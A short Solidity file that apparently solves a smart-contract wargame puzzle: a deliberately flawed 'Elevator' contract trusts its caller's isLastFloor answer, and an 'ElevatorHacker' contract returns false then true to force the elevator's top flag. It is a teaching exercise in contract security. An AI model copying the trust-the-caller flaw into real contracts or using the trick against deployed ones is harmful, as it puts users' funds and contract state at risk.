// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorHacker is Building {
  Elevator elevator;
  uint256 flag;

  constructor(address elevator_) {
    elevator = Elevator(elevator_);
  }

  function goTo(uint floor) external {
    require(!elevator.top(), 'Already on top');

    elevator.goTo(floor);
  }

  function isLastFloor(uint) external returns (bool) {
    ++flag;
    return flag > 1;
  }
}
